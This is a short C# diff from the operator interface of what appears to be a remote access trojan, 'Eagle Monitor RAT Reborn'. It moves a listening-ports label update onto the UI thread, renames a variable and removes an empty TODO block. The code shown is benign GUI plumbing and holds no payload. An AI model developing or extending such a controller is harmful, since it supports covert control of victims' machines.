@@ -54,28 +54,25 @@ namespace EagleMonitor
             }
             else 
             {
-                Process p = Process.Start("Eagle Monitor Configurator.exe");
+                Process proc = Process.Start("Eagle Monitor Configurator.exe");
                 Miscellaneous.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
-                p.WaitForExit();
-            }
-
-            if (File.Exists(Miscellaneous.GPath + "\\masstasks.json"))
-            {
-                //TODO
+                proc.WaitForExit();
             }
         }
         private void SettingsLoaded(IAsyncResult ar) 
         {
             loadSettings.EndInvoke(ar);
-
-           label2.Text = "Listening on : { ";
-            foreach (int p in Miscellaneous.settings.ports)
+            this.BeginInvoke((MethodInvoker)(() =>
             {
-                label2.Text += p.ToString() + ", ";
-            }
+                this.label2.Text = "Listening on : { ";
+                foreach (int p in Miscellaneous.settings.ports)
+                {
+                    this.label2.Text += p.ToString() + ", ";
+                }
 
-            label2.Text = label2.Text.Remove(label2.Text.Length - 2, 2);
-            label2.Text += " }";
+                this.label2.Text = this.label2.Text.Remove(this.label2.Text.Length - 2, 2);
+                this.label2.Text += " }";
+            }));
         }
 
         private string PerformanceCalculator()
@@ -96,10 +93,10 @@ namespace EagleMonitor
 
         private void Main_Load(object sender, EventArgs e)
         {
+
             new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView1, guna2VScrollBar1, true);
             this.Text = "Eagle Monitor RAT Reborn" + " @Welcome " + Environment.UserName + " !";
             this.label1.Text = "Eagle Monitor RAT Reborn" + " @Welcome " + Environment.UserName + " !";
-            //new BlurForm(this);
             Miscellaneous.Enable(this.dataGridView1);
         }
 
